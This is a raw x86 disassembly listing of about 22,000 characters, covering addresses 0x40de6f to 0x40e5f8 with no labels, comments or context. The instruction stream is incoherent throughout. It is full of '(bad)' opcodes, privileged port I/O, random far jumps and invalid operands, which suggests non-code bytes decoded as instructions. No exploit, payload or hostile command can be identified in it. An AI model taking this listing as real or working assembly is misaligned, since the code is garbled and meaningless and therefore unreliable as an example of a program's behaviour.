  40de6f:	and    DWORD PTR [eax],eax
  40de71:	mov    dl,0x33
  40de73:	ret    0x5bd8
  40de76:	call   0xcf3c6a14
  40de7b:	add    eax,0x7a9d6763
  40de80:	and    dh,BYTE PTR [edi]
  40de82:	fs jb  0x40de2a
  40de85:	or     eax,0x51df3421
  40de8a:	stc    
  40de8b:	fucomip st,st(0)
  40de8d:	pop    ss
  40de8e:	dec    ebp
  40de8f:	dec    esp
  40de90:	in     eax,dx
  40de91:	pop    edx
  40de92:	jle    0x40deb7
  40de94:	leave  
  40de95:	retf   
  40de96:	jo     0x40de36
  40de98:	jns    0x40defa
  40de9a:	cmp    BYTE PTR [ebx],dh
  40de9c:	retf   
  40de9d:	cwde   
  40de9e:	popfw  
  40dea0:	xchg   esp,eax
  40dea1:	jecxz  0x40debc
  40dea3:	dec    ebp
  40dea4:	xor    al,0x11
  40dea6:	pop    esp
  40dea7:	cs pop edi
  40dea9:	inc    ebp
  40deaa:	hlt    
  40deab:	mov    WORD PTR es:[ebp-0x7],?
  40deaf:	mov    bh,0xd2
  40deb1:	cli    
  40deb2:	and    DWORD PTR [esi-0x60],edx
  40deb5:	or     BYTE PTR [ecx-0x64472749],dh
  40debb:	gs aam 0x4c
  40debe:	rol    BYTE PTR [eax+edx*1-0x68c88add],1
  40dec5:	push   es
  40dec6:	dec    edx
  40dec7:	cmp    edx,eax
  40dec9:	mov    bh,0x6b
  40decb:	loop   0x40df19
  40decd:	push   edi
  40dece:	xor    ah,BYTE PTR [ebp-0x18]
  40ded1:	imul   ebp,DWORD PTR [edx-0x10da2403],0xffffffba
  40ded8:	iret   
  40ded9:	call   DWORD PTR [edx+0x317ff8d7]
  40dedf:	pop    ebp
  40dee0:	arpl   WORD PTR ss:[eax-0x4e91eb82],ax
  40dee7:	push   edi
  40dee8:	aas    
  40dee9:	hlt    
  40deea:	div    eax
  40deec:	cmp    BYTE PTR [eax+eiz*2+0x60332b00],al
  40def3:	mov    ds:0x902595b8,al
  40def8:	retf   
  40def9:	fistp  DWORD PTR [ebx+ebp*4-0x3]
  40defd:	xor    eax,DWORD PTR [ecx]
  40deff:	pop    ebp
  40df00:	fisttp DWORD PTR [ecx+ebp*1]
  40df03:	jbe    0x40df09
  40df05:	cmp    al,0x29
  40df07:	out    dx,eax
  40df08:	push   es
  40df09:	pusha  
  40df0a:	jl     0x40df5b
  40df0c:	jmp    0x40de9e
  40df0e:	sahf   
  40df0f:	xchg   BYTE PTR [esi+0x4f],ah
  40df12:	adc    cl,cl
  40df14:	push   edx
  40df15:	pop    edi
  40df16:	mov    eax,0x93359486
  40df1b:	sub    al,0xd8
  40df1d:	push   cs
  40df1e:	or     BYTE PTR [edi],bh
  40df20:	stc    
  40df21:	rcr    WORD PTR [edi+0x182dd0ac],cl
  40df28:	mov    fs,WORD PTR [eax-0x7d]
  40df2b:	xchg   ebp,eax
  40df2c:	push   ss
  40df2d:	es iret 
  40df2f:	mov    dl,0xfc
  40df31:	in     eax,0x95
  40df33:	adc    eax,0xff2d1f01
  40df38:	(bad)  
  40df39:	in     eax,dx
  40df3a:	or     DWORD PTR [edx+0x24],ebx
  40df3d:	loope  0x40df52
  40df3f:	xchg   ebp,eax
  40df40:	icebp  
  40df41:	mov    DWORD PTR [ecx+0x9],esp
  40df44:	dec    eax
  40df45:	sub    BYTE PTR [esi+ecx*8+0x5a],ch
  40df49:	sar    ebx,cl
  40df4b:	mov    bl,0xbe
  40df4d:	ds nop
  40df4f:	int    0x9d
  40df51:	jb     0x40df5c
  40df53:	cmp    edx,esp
  40df55:	jns    0x40df51
  40df57:	cs pop esi
  40df59:	in     eax,0x6c
  40df5b:	es xchg edi,eax
  40df5d:	mov    edi,0x43545cc3
  40df62:	sub    al,0xb4
  40df64:	test   ax,0x2a4
  40df68:	add    al,0x65
  40df6a:	mov    dh,0xd1
  40df6c:	ja     0x40df20
  40df6e:	push   cs
  40df6f:	pop    es
  40df70:	push   edi
  40df71:	pop    ebp
  40df72:	ds mov esi,0x3f64333e
  40df78:	and    bh,cl
  40df7a:	push   edi
  40df7b:	push   esp
  40df7c:	lods   eax,DWORD PTR ds:[esi]
  40df7d:	mov    BYTE PTR [ecx],0x17
  40df80:	(bad)  
  40df81:	fild   DWORD PTR [ecx]
  40df83:	fadd   DWORD PTR [edx+0x569b1417]
  40df89:	cmc    
  40df8a:	mov    ebp,0xdabdb2d0
  40df8f:	rol    DWORD PTR [ebp-0x33],1
  40df92:	add    DWORD PTR [ecx-0x1666e0c0],ebp
  40df98:	mov    edi,0x26b53d80
  40df9d:	dec    ecx
  40df9e:	rcl    DWORD PTR [edx+0x32f76f07],cl
  40dfa4:	jo     0x40df48
  40dfa6:	fistp  QWORD PTR [esi+ebx*4-0x42]
  40dfaa:	cld    
  40dfab:	(bad)  
  40dfac:	or     ah,bl
  40dfae:	dec    eax
  40dfaf:	add    ebx,DWORD PTR [edi-0x1]
  40dfb2:	mov    BYTE PTR [ebp+0x4e91ec4f],bl
  40dfb8:	lock vandnps xmm2,xmm0,XMMWORD PTR [edx+0x7a69ccef]
  40dfc1:	mov    BYTE PTR [ecx],ch
  40dfc3:	aas    
  40dfc4:	sbb    bh,0xc0
  40dfc7:	mov    ds:0xfef963de,eax
  40dfcc:	mov    al,0x80
  40dfce:	sub    al,0x70
  40dfd0:	pop    esi
  40dfd1:	stos   BYTE PTR es:[edi],al
  40dfd2:	and    dh,bh
  40dfd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfd5:	dec    esp
  40dfd6:	jmp    0x40e037
  40dfd8:	inc    edi
  40dfd9:	xlat   BYTE PTR ds:[ebx]
  40dfda:	or     DWORD PTR ds:0xa1c5daea,ecx
  40dfe0:	jmp    FWORD PTR [ebx+0x79]
  40dfe3:	addr16 and al,0xd3
  40dfe6:	das    
  40dfe7:	in     eax,0x59
  40dfe9:	add    al,0x77
  40dfeb:	or     DWORD PTR [eax+0x350e26b3],esi
  40dff1:	and    BYTE PTR [eax-0x9],dl
  40dff4:	xchg   edx,eax
  40dff5:	mov    dh,0xc5
  40dff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff8:	sub    ebx,eax
  40dffa:	xchg   ebp,eax
  40dffb:	nop
  40dffc:	add    eax,0x665751d
  40e001:	cmp    BYTE PTR [eax+0x6dc77c12],ah
  40e007:	lea    ebx,[esi+0x56f5d524]
  40e00d:	mov    bl,0xa6
  40e00f:	adc    BYTE PTR [esi+0x2f36502a],0x58
  40e016:	mov    ebx,0xa4171c6d
  40e01b:	add    esi,esi
  40e01d:	sub    BYTE PTR [edx-0x2e3fee7e],al
  40e023:	imul   edi,DWORD PTR [ebx],0xffffff88
  40e026:	mov    cl,0xbe
  40e028:	dec    edi
  40e029:	ficom  DWORD PTR [edx]
  40e02b:	adc    ebx,DWORD PTR [ebx]
  40e02d:	mov    esp,0xcf4a50fd
  40e032:	pop    es
  40e033:	mov    edx,0x9e3f7e2b
  40e038:	in     al,0x26
  40e03a:	lahf   
  40e03b:	stc    
  40e03c:	xlat   BYTE PTR ds:[ebx]
  40e03d:	dec    ebp
  40e03e:	cmp    al,0xef
  40e040:	iret   
  40e041:	mov    ah,0xd0
  40e043:	jo     0x40e080
  40e045:	idiv   edx
  40e047:	ins    BYTE PTR es:[edi],dx
  40e048:	sub    DWORD PTR [eax+0x62],edx
  40e04b:	shl    BYTE PTR [ecx+0x1aec67da],cl
  40e051:	shr    DWORD PTR [esi-0x8cc4a1d],cl
  40e057:	cdq    
  40e058:	ins    BYTE PTR es:[edi],dx
  40e059:	(bad)  
  40e05a:	cmp    esp,edi
  40e05c:	jnp    0x40e03d
  40e05e:	in     al,0x21
  40e060:	or     al,0x69
  40e062:	inc    ebp
  40e063:	nop
  40e064:	push   eax
  40e065:	jne    0x40e047
  40e067:	sbb    DWORD PTR [di-0x70],edx
  40e06b:	popa   
  40e06c:	jmp    0xaf501367
  40e071:	jmp    0xe084e38a
  40e076:	out    dx,eax
  40e077:	sub    al,0xef
  40e079:	xchg   esp,eax
  40e07a:	push   0xa3768677
  40e07f:	shr    DWORD PTR [edi+ebx*8-0x2d],cl
  40e083:	add    eax,0x419dd4cd
  40e088:	lds    esp,FWORD PTR [edi+0x493de2f7]
  40e08e:	dec    ebx
  40e08f:	outs   dx,BYTE PTR ds:[esi]
  40e090:	sub    DWORD PTR [ecx+0x662a27a9],eax
  40e096:	mov    bl,0x4a
  40e098:	call   DWORD PTR [ebx-0x77e2053b]
  40e09e:	jmp    0x9af1a586
  40e0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0a4:	icebp  
  40e0a5:	stos   BYTE PTR es:[edi],al
  40e0a6:	sub    eax,0xbfe314b9
  40e0ab:	xor    ebp,DWORD PTR [eax+ebp*4+0xe]
  40e0af:	daa    
  40e0b0:	cmp    al,0x75
  40e0b2:	pushf  
  40e0b3:	(bad)  
  40e0b4:	xor    ebx,edx
  40e0b6:	push   cs
  40e0b7:	bound  edx,QWORD PTR [eax]
  40e0b9:	out    0xcc,al
  40e0bb:	movsx  ebx,BYTE PTR [eax-0x55]
  40e0bf:	mov    edi,0x140f4bb
  40e0c4:	int    0x2a
  40e0c6:	inc    edx
  40e0c7:	mov    gs,WORD PTR ds:0xeafc9624
  40e0cd:	ror    BYTE PTR [ecx+ebx*2-0x37b31c57],0x99
  40e0d5:	push   ds
  40e0d6:	jmp    0x40e103
  40e0d8:	xchg   BYTE PTR [esi],al
  40e0da:	sbb    al,0xe0
  40e0dc:	loopne 0x40e0cc
  40e0de:	adc    BYTE PTR [edx],0xd2
  40e0e1:	mov    al,ds:0x33a232d4
  40e0e6:	dec    ebx
  40e0e7:	xchg   ecx,eax
  40e0e8:	retf   
  40e0e9:	les    ecx,FWORD PTR [edx+0x44dcf338]
  40e0ef:	in     eax,0xac
  40e0f1:	pop    eax
  40e0f2:	sub    al,0x66
  40e0f4:	(bad)  
  40e0f5:	mov    edi,0xe509b4
  40e0fa:	pusha  
  40e0fb:	inc    esp
  40e0fc:	xor    DWORD PTR [edi+0x2cfd8c8],0xa593b10f
  40e106:	jle    0x40e093
  40e108:	pop    ecx
  40e109:	mov    eax,ds:0xbed7403b
  40e10e:	fadd   st,st(6)
  40e110:	fldcw  WORD PTR ds:0x7b89e199
  40e116:	mov    eax,0xdb0c08f0
  40e11b:	or     esi,DWORD PTR [ecx-0x7]
  40e11e:	(bad)  
  40e121:	mov    cl,0xb
  40e123:	retf   
  40e124:	dec    ebx
  40e125:	dec    esp
  40e126:	pusha  
  40e127:	shr    BYTE PTR [ebp+0xd],1
  40e12a:	pop    ebp
  40e12b:	rcl    BYTE PTR [edi-0x7c],1
  40e12e:	adc    al,0x45
  40e130:	xor    ecx,DWORD PTR [edi+0x40445aa]
  40e136:	(bad)  
  40e137:	jmp    0x40e165
  40e139:	mov    ebx,0xbb79f288
  40e13e:	mov    ds:0xdd75c712,eax
  40e143:	sub    ah,BYTE PTR [eax-0x73]
  40e146:	test   DWORD PTR [eax-0x65],0xf77ce209
  40e14d:	sub    al,0xa3
  40e14f:	mov    eax,ds:0xc6e573f9
  40e154:	ret    0x12da
  40e157:	cwde   
  40e158:	out    dx,al
  40e159:	sub    esp,DWORD PTR ss:[eax+edi*8]
  40e15d:	jmp    0x40e124
  40e15f:	dec    edi
  40e160:	jmp    0x34da28af
  40e165:	in     al,0xac
  40e167:	pushf  
  40e168:	adc    al,dh
  40e16a:	adc    BYTE PTR [eax],al
  40e16c:	add    DWORD PTR [edx-0x28],eax
  40e16f:	cmp    eax,0xf9802926
  40e174:	in     eax,0x38
  40e176:	imul   ebp,DWORD PTR [esi+edx*1+0x59d8a6c9],0xfb93c3c0
  40e181:	add    dh,BYTE PTR [esi]
  40e183:	hlt    
  40e184:	(bad)  
  40e185:	fidivr DWORD PTR [ecx+ebx*4-0x2]
  40e189:	lock dec ecx
  40e18b:	xchg   edi,eax
  40e18c:	dec    ecx
  40e18d:	xchg   esi,eax
  40e18e:	dec    ecx
  40e18f:	add    al,0xa4
  40e191:	fild   DWORD PTR [ecx-0x794e6ced]
  40e197:	xor    ecx,esi
  40e199:	jns    0x40e215
  40e19b:	pop    es
  40e19c:	test   DWORD PTR ds:0x7ff67f4e,esi
  40e1a2:	call   DWORD PTR [eax+0x5]
  40e1a5:	jo     0x40e1ec
  40e1a7:	mov    dl,0x3e
  40e1a9:	leave  
  40e1aa:	ss mov dh,0x3c
  40e1ad:	imul   ebx,ebx,0x92ab2762
  40e1b3:	cmc    
  40e1b4:	lock pop ss
  40e1b6:	mov    al,0x35
  40e1b8:	pop    edi
  40e1b9:	inc    eax
  40e1ba:	mov    DWORD PTR [ebx],edx
  40e1bc:	push   ebp
  40e1bd:	adc    bl,cl
  40e1bf:	fisttp DWORD PTR [eax]
  40e1c1:	push   ds
  40e1c2:	loopne 0x40e21b
  40e1c4:	jecxz  0x40e1b3
  40e1c6:	inc    ebx
  40e1c7:	jp     0x40e1a4
  40e1c9:	hlt    
  40e1ca:	and    DWORD PTR [edx+edi*8+0x32],ebp
  40e1ce:	rcr    BYTE PTR es:[esi+0x7ca90807],cl
  40e1d5:	xchg   ebx,eax
  40e1d6:	fwait
  40e1d7:	sti    
  40e1d8:	and    DWORD PTR [edi],ebp
  40e1da:	pop    es
  40e1db:	inc    edx
  40e1dc:	mov    cl,0x86
  40e1de:	out    0x2c,al
  40e1e0:	pop    esp
  40e1e1:	dec    DWORD PTR [ebp-0x5d]
  40e1e4:	pop    ebx
  40e1e5:	rol    DWORD PTR [eax],0x67
  40e1e8:	outs   dx,DWORD PTR ds:[esi]
  40e1e9:	and    esi,DWORD PTR [eax+0x68]
  40e1ec:	cmp    DWORD PTR [eax+ecx*1+0x79],edx
  40e1f0:	fisub  WORD PTR [edx-0x36b63f77]
  40e1f6:	pop    edx
  40e1f7:	je     0x40e230
  40e1f9:	inc    ecx
  40e1fa:	(bad)  
  40e1fb:	fidivr DWORD PTR [edi+0x6f]
  40e1fe:	ins    BYTE PTR es:[edi],dx
  40e1ff:	add    dl,BYTE PTR [edx-0x3e8a39fc]
  40e205:	pushf  
  40e206:	xor    al,0xfd
  40e208:	lods   al,BYTE PTR ds:[esi]
  40e209:	ret    0xbd33
  40e20c:	mov    esp,0xa0c5c33f
  40e211:	xor    DWORD PTR [edi+0x26],0xffffff87
  40e215:	fisttp QWORD PTR [ecx-0x7856bfd0]
  40e21b:	jns    0x40e1e1
  40e21d:	mov    edx,0x5a1b1e99
  40e222:	push   edi
  40e223:	int    0x84
  40e225:	sbb    DWORD PTR [ebp+0x5d1896d5],edi
  40e22b:	cmp    DWORD PTR [esi+0x64],esp
  40e22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e22f:	cs aas 
  40e231:	in     al,dx
  40e232:	sbb    esi,DWORD PTR [eax+0x57092c27]
  40e238:	pop    esp
  40e239:	dec    ecx
  40e23a:	scas   eax,DWORD PTR es:[edi]
  40e23b:	stos   BYTE PTR es:[edi],al
  40e23c:	dec    esp
  40e23d:	dec    esi
  40e23e:	xor    BYTE PTR [ecx+0x3e87c10],dh
  40e244:	pop    ss
  40e245:	ret    0x24d3
  40e248:	dec    ebp
  40e249:	popa   
  40e24a:	mov    ah,0x29
  40e24c:	mov    esp,0xbb8761ae
  40e251:	dec    edi
  40e252:	inc    ecx
  40e253:	test   BYTE PTR [ecx+esi*2-0x644ffbf5],cl
  40e25a:	sbb    eax,0xd46d60c2
  40e25f:	push   eax
  40e260:	jle    0x40e203
  40e262:	xor    ch,BYTE PTR [ebx+0x233c72e4]
  40e268:	hlt    
  40e269:	call   0xfd14:0x62dd575e
  40e270:	inc    esi
  40e271:	jmp    0x1826:0x99924b77
  40e278:	xchg   ebp,eax
  40e279:	xlat   BYTE PTR ds:[ebx]
  40e27a:	inc    edi
  40e27b:	dec    BYTE PTR [ebx+0x5a1d3c13]
  40e281:	test   esp,ebx
  40e283:	mov    ecx,0x764c0c90
  40e288:	jno    0x40e272
  40e28a:	retf   
  40e28b:	ins    DWORD PTR es:[edi],dx
  40e28c:	mov    bh,0x65
  40e28e:	es xchg ecx,eax
  40e290:	(bad)  [esi+0x21]
  40e293:	and    ecx,esi
  40e295:	jge    0x40e269
  40e297:	ror    DWORD PTR [ebp-0x5a],0xf7
  40e29b:	mov    al,ds:0x82956b84
  40e2a0:	xor    edi,DWORD PTR [edi-0x36]
  40e2a3:	push   ebp
  40e2a4:	lds    edi,FWORD PTR [edi]
  40e2a6:	fnstcw WORD PTR [ebx]
  40e2a8:	or     edx,edi
  40e2aa:	int3   
  40e2ab:	(bad)  
  40e2ac:	sar    BYTE PTR [edx],cl
  40e2ae:	fisubr WORD PTR [eax]
  40e2b0:	jge    0x40e262
  40e2b2:	push   0x1d6ccb4f
  40e2b7:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2b9:	sub    DWORD PTR [ebp-0x1b40e236],eax
  40e2bf:	mov    al,0x62
  40e2c1:	fimul  WORD PTR [ebp+0x637d4fb]
  40e2c7:	jp     0x40e253
  40e2c9:	sbb    edi,esp
  40e2cb:	pop    ss
  40e2cc:	pop    ebp
  40e2cd:	pop    ecx
  40e2ce:	repz adc bh,BYTE PTR [ebx+0x6b25433]
  40e2d5:	or     eax,0xd4f580e1
  40e2da:	lds    edi,FWORD PTR [edx]
  40e2dc:	gs (bad) 
  40e2de:	push   ss
  40e2df:	or     DWORD PTR [ecx],eax
  40e2e1:	adc    dh,bl
  40e2e3:	(bad)  
  40e2e5:	sub    edi,DWORD PTR [eax]
  40e2e7:	cmp    eax,0x19bd36f0
  40e2ec:	inc    edx
  40e2ed:	cmp    eax,0xc96ae0a4
  40e2f2:	(bad)  
  40e2f4:	push   ecx
  40e2f5:	dec    edi
  40e2f6:	sub    eax,0xb2a0ae90
  40e2fb:	icebp  
  40e2fc:	cdq    
  40e2fd:	xlat   BYTE PTR ds:[ebx]
  40e2fe:	(bad)  
  40e2ff:	sbb    eax,esp
  40e301:	xchg   ecx,eax
  40e302:	push   es
  40e303:	fild   DWORD PTR [eax+0x3b533a21]
  40e309:	jl     0x40e307
  40e30b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e30c:	js     0x40e33c
  40e30e:	adc    ch,ch
  40e310:	or     DWORD PTR [ecx],ebx
  40e312:	push   esi
  40e313:	cmp    BYTE PTR [ebp+0x251a1535],ch
  40e319:	push   edi
  40e31a:	arpl   WORD PTR [ecx+0x2d],ax
  40e31d:	or     cl,BYTE PTR [edx+0x391fac61]
  40e323:	adc    ah,BYTE PTR ds:0x7fabaf1a
  40e329:	or     DWORD PTR [ebp-0x57],esi
  40e32c:	pop    ss
  40e32d:	jae    0x40e315
  40e32f:	imul   ebp,DWORD PTR [esi+eiz*2+0x1e60d116],0x5c
  40e337:	mov    eax,ds:0x48666ff6
  40e33c:	gs push ds
  40e33e:	jl     0x40e305
  40e340:	jno    0x40e36c
  40e342:	out    dx,al
  40e343:	xor    al,0xed
  40e345:	cs jge 0x40e3c5
  40e348:	retf   0xfae1
  40e34b:	ss stos DWORD PTR es:[edi],eax
  40e34d:	xchg   edi,eax
  40e34e:	imul   edi,DWORD PTR [esp+edx*4-0x47cd2af1],0xfffffffe
  40e356:	(bad)  
  40e357:	ficomp WORD PTR [edx]
  40e359:	push   ss
  40e35a:	mov    ebp,ebp
  40e35c:	sbb    eax,DWORD PTR [ebx+0x7e02c68d]
  40e362:	clc    
  40e363:	fadd   QWORD PTR [eax]
  40e365:	jns    0x40e3b1
  40e367:	mov    bh,0x5c
  40e369:	loope  0x40e35c
  40e36b:	icebp  
  40e36c:	sub    cl,dl
  40e36e:	sub    al,0x38
  40e370:	cld    
  40e371:	xchg   BYTE PTR [edx+eiz*2+0x54210189],ah
  40e378:	cmp    DWORD PTR [ecx],0xffffffe6
  40e37b:	push   esp
  40e37c:	xchg   BYTE PTR [eax],cl
  40e37e:	hlt    
  40e37f:	shr    DWORD PTR [edx+0x2a],0xd
  40e383:	add    al,0xed
  40e385:	retf   
  40e386:	adc    BYTE PTR [edi-0x47],dh
  40e389:	les    eax,FWORD PTR [esi-0x2a]
  40e38c:	mov    eax,0x64b37f7f
  40e391:	xor    dh,BYTE PTR [edi-0x5a058974]
  40e397:	sbb    ecx,eax
  40e399:	cmc    
  40e39a:	pop    ebp
  40e39b:	add    bh,BYTE PTR [edx+edx*1-0x6f]
  40e39f:	push   edi
  40e3a0:	ret    0x79b1
  40e3a3:	js     0x40e39e
  40e3a5:	nop
  40e3a6:	repnz mov dl,0xf7
  40e3a9:	jae    0x40e428
  40e3ab:	and    ah,BYTE PTR [esi]
  40e3ad:	sub    DWORD PTR [eax-0x6],ebx
  40e3b0:	repz repz aas 
  40e3b3:	sti    
  40e3b4:	mov    ds:0xe4bfeef8,eax
  40e3b9:	lahf   
  40e3ba:	out    0x50,eax
  40e3bc:	sbb    BYTE PTR [edx-0xbe1c06e],0x27
  40e3c3:	daa    
  40e3c4:	idiv   BYTE PTR [ebx-0x51c7b43e]
  40e3ca:	and    eax,0xb5269dfa
  40e3cf:	push   edx
  40e3d0:	bound  esp,QWORD PTR [eax+eax*4+0x6c3029f1]
  40e3d7:	push   es
  40e3d8:	scas   al,BYTE PTR es:[edi]
  40e3d9:	pusha  
  40e3da:	xchg   ebp,eax
  40e3db:	aaa    
  40e3dc:	sbb    al,BYTE PTR [eax]
  40e3de:	add    al,0xdb
  40e3e0:	mov    DWORD PTR [ebp+0x127d9b9f],0xb1eaded5
  40e3ea:	test   DWORD PTR [edi],0x22f778d
  40e3f0:	iret   
  40e3f1:	mov    BYTE PTR [ebp-0x2b],al
  40e3f4:	cmc    
  40e3f5:	mov    ?,WORD PTR [ecx]
  40e3f7:	(bad)  
  40e3f8:	adc    edx,DWORD PTR ds:0xa48d6574
  40e3fe:	dec    esp
  40e3ff:	pop    ebx
  40e400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e401:	iret   
  40e402:	mov    dl,0xf5
  40e404:	aam    0xdb
  40e406:	int3   
  40e407:	imul   esi,DWORD PTR [esp+eax*8],0x62
  40e40b:	mov    ds:0xb514866e,al
  40e410:	iret   
  40e411:	fcomip st,st(1)
  40e413:	sub    al,0xfd
  40e415:	dec    esp
  40e416:	jp     0x40e3ac
  40e418:	push   esi
  40e419:	jnp    0x40e43d
  40e41b:	adc    eax,DWORD PTR [edx-0x48c9a962]
  40e421:	jle    0x40e3d2
  40e423:	add    al,0xce
  40e425:	jl     0x40e425
  40e427:	jl     0x40e456
  40e429:	push   eax
  40e42a:	sub    al,0x43
  40e42c:	and    BYTE PTR [ecx+0x6d],ah
  40e42f:	and    eax,0x32ce4fd1
  40e434:	cdq    
  40e435:	mov    edi,0x71afc345
  40e43a:	fld    TBYTE PTR cs:[esi]
  40e43d:	lea    edi,[eax]
  40e43f:	scas   eax,DWORD PTR es:[edi]
  40e440:	pushf  
  40e441:	in     eax,0xb5
  40e443:	das    
  40e444:	mov    cl,0x4e
  40e446:	cmp    ebx,ebx
  40e448:	fs or  ah,BYTE PTR ss:[esi-0x78]
  40e44d:	pop    ds
  40e44e:	mov    ch,0xa0
  40e450:	adc    dh,0xaf
  40e453:	(bad)  
  40e454:	scas   eax,DWORD PTR es:[edi]
  40e455:	test   DWORD PTR [ebp+0x79],esi
  40e458:	(bad)  
  40e459:	add    esp,esp
  40e45b:	mov    ah,0x3b
  40e45d:	lds    esp,FWORD PTR [ecx+0x55]
  40e460:	popf   
  40e461:	jecxz  0x40e48b
  40e463:	dec    ebx
  40e464:	or     al,0x96
  40e466:	(bad)
  40e469:	retf   0xe026
  40e46c:	push   cs
  40e46d:	cmp    ebp,DWORD PTR [ecx-0x28]
  40e470:	and    al,0xbd
  40e472:	push   0x81e5b8d2
  40e477:	call   0xe91cb6aa
  40e47c:	push   ds
  40e47d:	pop    eax
  40e47e:	dec    ebp
  40e47f:	and    ah,ah
  40e481:	lods   eax,DWORD PTR ds:[esi]
  40e482:	xchg   ebp,eax
  40e483:	push   0x3073b234
  40e488:	out    0x88,eax
  40e48a:	test   al,0xe3
  40e48c:	js     0x40e465
  40e48e:	sbb    al,0x61
  40e490:	sub    DWORD PTR [ecx],edi
  40e492:	test   DWORD PTR [eax+0x66],esp
  40e495:	push   esp
  40e496:	mov    cl,BYTE PTR [ebx-0x5e93f616]
  40e49c:	mov    esi,0xde9c52dd
  40e4a1:	add    al,0xeb
  40e4a3:	popf   
  40e4a4:	aaa    
  40e4a5:	sbb    DWORD PTR [edi],ebp
  40e4a7:	icebp  
  40e4a8:	outs   dx,DWORD PTR ds:[esi]
  40e4a9:	pop    DWORD PTR [edx-0x53]
  40e4ac:	xchg   edx,eax
  40e4ad:	jmp    0x40e4bd
  40e4af:	out    0xb9,al
  40e4b1:	push   0xffffffa7
  40e4b3:	xor    ah,ah
  40e4b5:	xchg   DWORD PTR [ebp-0x23],esp
  40e4b8:	movzx  ecx,BYTE PTR [edx+0x1e]
  40e4bc:	int    0x5e
  40e4be:	sub    DWORD PTR [ecx],0x3a6d2d07
  40e4c4:	sub    al,BYTE PTR [edx-0x2]
  40e4c7:	sbb    al,0xa2
  40e4c9:	push   0xffffffe8
  40e4cb:	sbb    al,0x34
  40e4cd:	dec    eax
  40e4ce:	retf   
  40e4cf:	sub    eax,0x1846e5fb
  40e4d4:	add    BYTE PTR [ebx-0x48],al
  40e4d7:	mov    ds:0xfcf97eab,eax
  40e4dc:	std    
  40e4dd:	jne    0x40e4cb
  40e4df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4e0:	cmp    edx,DWORD PTR [eax+0x40]
  40e4e3:	lods   al,BYTE PTR ds:[esi]
  40e4e4:	pop    es
  40e4e5:	lea    ecx,[esi+edx*2+0x51c857cc]
  40e4ec:	mov    dl,0xb1
  40e4ee:	pusha  
  40e4ef:	adc    dh,BYTE PTR [ecx]
  40e4f1:	das    
  40e4f2:	and    edi,esi
  40e4f4:	sub    bh,BYTE PTR es:[ebp+0x45e7e7b6]
  40e4fb:	cmp    edi,DWORD PTR ds:0x648b997f
  40e501:	pop    edx
  40e502:	call   FWORD PTR [edi+0x7c]
  40e505:	mov    dh,0xa
  40e507:	inc    edi
  40e508:	push   0x59c48cec
  40e50d:	sub    ecx,DWORD PTR [ebp-0x3b]
  40e510:	mov    bh,0xbd
  40e512:	mov    ds:0x6dafdf06,al
  40e517:	jle    0x40e594
  40e519:	out    0x70,al
  40e51b:	sub    eax,0xee4656b8
  40e520:	fsub   DWORD PTR [esp+eiz*2]
  40e523:	xor    BYTE PTR [edx+0x2446dd53],al
  40e529:	neg    DWORD PTR [esi]
  40e52b:	sbb    DWORD PTR [ecx-0x30],edx
  40e52e:	test   eax,0x47392a19
  40e533:	pop    edx
  40e534:	cli    
  40e535:	scas   al,BYTE PTR es:[edi]
  40e536:	rcr    BYTE PTR [ecx-0x3419542b],cl
  40e53c:	mov    al,ds:0x442e8e59
  40e541:	es xchg edi,eax
  40e543:	lods   eax,DWORD PTR ds:[esi]
  40e544:	data16 and ch,al
  40e547:	repnz inc ebx
  40e549:	(bad)  
  40e54a:	xor    eax,0xbf9eba9d
  40e54f:	retf   
  40e550:	adc    al,0x36
  40e552:	mov    al,ds:0x52ced31c
  40e557:	mov    al,ds:0x3e1eb1f
  40e55c:	xchg   esi,eax
  40e55d:	adc    BYTE PTR [ecx],cl
  40e55f:	push   ecx
  40e560:	test   BYTE PTR [edi-0x12],dh
  40e563:	cld    
  40e564:	rol    DWORD PTR [ecx],0x5a
  40e567:	sbb    edi,ebx
  40e569:	pop    edx
  40e56b:	or     bl,ah
  40e56d:	push   eax
  40e56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e56f:	aad    0x9d
  40e571:	sti    
  40e572:	lds    edi,FWORD PTR [ebx-0x2fcb4aea]
  40e578:	jecxz  0x40e528
  40e57a:	mov    WORD PTR [edi],es
  40e57c:	sbb    BYTE PTR [eax+0xd3f5d72],al
  40e582:	ins    BYTE PTR es:[edi],dx
  40e583:	stc    
  40e584:	jo     0x40e53b
  40e586:	add    dh,BYTE PTR [edx+0x29]
  40e589:	and    ecx,DWORD PTR [ecx-0x5736bc3f]
  40e58f:	mov    eax,0x42d59455
  40e594:	cmp    DWORD PTR [esi-0x3f721211],eax
  40e59a:	(bad)
  40e59d:	sub    ebp,DWORD PTR [edx-0x44]
  40e5a0:	pop    ebx
  40e5a1:	pusha  
  40e5a2:	pop    es
  40e5a3:	adc    ebp,eax
  40e5a5:	into   
  40e5a6:	nop
  40e5a7:	pop    ss
  40e5a8:	fcomp  QWORD PTR [ecx-0x42936b54]
  40e5af:	mov    ecx,0x67d04803
  40e5b4:	ds loopne 0x40e5b5
  40e5b7:	lods   al,BYTE PTR ds:[esi]
  40e5b8:	adc    al,0xcc
  40e5ba:	or     eax,0x405d5653
  40e5bf:	fist   DWORD PTR [ecx]
  40e5c1:	sub    eax,0xfd1c883f
  40e5c6:	call   0x95f0e4df
  40e5cb:	sbb    ecx,DWORD PTR [ebx-0x7a]
  40e5ce:	pushf  
  40e5cf:	pop    ss
  40e5d0:	aas    
  40e5d1:	jle    0x40e55e
  40e5d3:	sahf   
  40e5d4:	aam    0x71
  40e5d6:	push   0x4b7547b8
  40e5db:	jge    0x40e5e7
  40e5dd:	mov    eax,0x4f2dcf93
  40e5e2:	mov    ds:0x6639412,eax
  40e5e7:	and    DWORD PTR [ecx-0x4bf75131],0xeb115a61
  40e5f1:	iret   
  40e5f2:	xchg   esp,eax
  40e5f3:	in     al,0xd2
  40e5f5:	adc    eax,DWORD PTR [edi+0x5]
  40e5f8:	mov    esi,0x1848dd38
